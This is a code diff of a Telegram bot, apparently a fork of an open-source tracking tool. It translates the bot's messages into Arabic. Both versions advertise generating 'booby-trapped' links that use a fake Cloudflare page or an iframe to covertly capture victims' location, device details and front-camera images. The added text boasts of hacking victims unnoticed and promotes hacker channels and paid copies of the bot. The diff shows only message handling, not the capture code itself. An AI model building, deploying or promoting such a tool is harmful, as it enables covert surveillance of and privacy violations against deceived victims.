@@ -62,29 +62,30 @@ const chatId = msg.chat.id;
 
  
 
-if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
+if(msg?.reply_to_message?.text=="🌐 ارسل رابط كي يتم تلغيمه"){
  createLink(chatId,msg.text); 
 }
   
 if(msg.text=="/start"){
 var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
+reply_markup:JSON.stringify({"inline_keyboard":[[{text:"اضغط لصنع رابط ملغم",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `مرحبا ${msg.chat.first_name} ! , \nفي بوت حاكم الدمار إختراق الكاميرا الاماميه والموقع🕸😈.\nوبعض المعلومات الحاسسه في جهاز  الضحية🥷🏾✅\n\nارسل. /help لمعرفه طريقه استخدام البوت. .`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
+bot.sendMessage(chatId,` هلا بك في بوت حاكم الدمار 😈 إختراق الكاميرا الاماميه وموقع الضحيه وبعض المعلومات الحاسسه في جهاز  الضحية برابط فقط👨‍💻⚠️.\n\nارسل. /create \nAfter receiving
 the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
+\n\nطبعا تقوم برسال للبوت اي رابط وسوف يقوم البوت في تلغيم الربط. ⚠️ملاحظة سوف يتم اظهار صفحة اعلانيه عندما يدخل الضحيه الرابط ومن ثم يتم توجهة الي الرابط الذي قمت بكتابته الي الرابط الحقيقي دون اي يعرف الضحية انه مخترق⚠️.
+\n .🛡كل شي تتعلمه مجانا داخل بوت المتجر @zzmarkets_bot  \n\n1. . قناتي الرسميه لتحديثات والجميع مطلبات الهاكر
+@SJGDDw
+\n2. . ⚠️ملاحظة من المستحيل للمطور او اي مستخدم في البوت معرفة اي رسالة لك في البوت الخاص بك🚷  بمكانك تلغيم اي رابط لفيديو او موقع فيس او انستا او اي شي مثال https://google.com )
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
+\n\nلطلب نسخة من البوت بكامل حقوقك التواصل مع سجاد  @m_07_d 
+"إن الله بما تعملون بصير
 `);
 }
   
@@ -137,7 +138,7 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `تم صنع رابط ملغم بنجاح🕸😈\nURL: ${msg}\n\n✅رابط الملغم  هذا\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
@@ -145,7 +146,7 @@ bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n�
 }
 }
 else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
+bot.sendMessage(cid,`⚠️ يرجى ارسال رابط صحيح , يجب ان يبدا الرابط بي  http or https.`);
 createNew(cid);
 
 }  
@@ -156,7 +157,7 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
+bot.sendMessage(cid,`🌐 ارسل رابط كي يتم تلغيمه`,mk);
 }
 
 
